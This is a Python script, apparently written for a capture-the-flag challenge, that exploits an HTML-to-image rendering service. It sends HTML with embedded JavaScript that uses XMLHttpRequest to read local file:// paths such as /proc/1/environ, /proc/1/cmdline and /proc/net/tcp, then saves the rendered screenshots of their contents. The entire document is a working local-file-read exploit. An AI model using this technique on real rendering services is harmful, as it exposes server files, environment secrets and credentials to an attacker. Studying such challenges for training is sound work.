import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=45)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    data = z.read(n)
                    out = f'f:/mission-git-hackss/mission-git-hackss/f_{name}.jpg'
                    with open(out, 'wb') as f: f.write(data)
                    print(f'{name}: {len(data)} bytes')
                return
            print(f'{name}: [{r.status_code}] {r.text[:150]}')
            return
        except Exception as e:
            time.sleep(2)
    print(f'{name}: failed')

# Use XHR to fetch file:// and dump into DOM as big text
def make_html(path):
    return f'''<!doctype html><html><head><style>
body{{font-family:monospace;font-size:20px;white-space:pre-wrap;word-break:break-all;padding:20px}}
</style></head><body><div id="out">loading...</div>
<script>
(function(){{
  var x=new XMLHttpRequest();
  try{{
    x.open("GET","file://{path}",false);
    x.send();
    document.getElementById("out").textContent = x.responseText || "(empty:"+x.status+")";
  }}catch(e){{document.getElementById("out").textContent="ERR:"+e;}}
}})();
</script></body></html>'''

# Test XHR file read on /etc/passwd first to confirm it works
render(make_html('/proc/net/tcp'), 'xhr_nettcp')
render(make_html('/proc/1/cmdline'), 'xhr_cmdline')
render(make_html('/proc/1/environ'), 'xhr_environ')
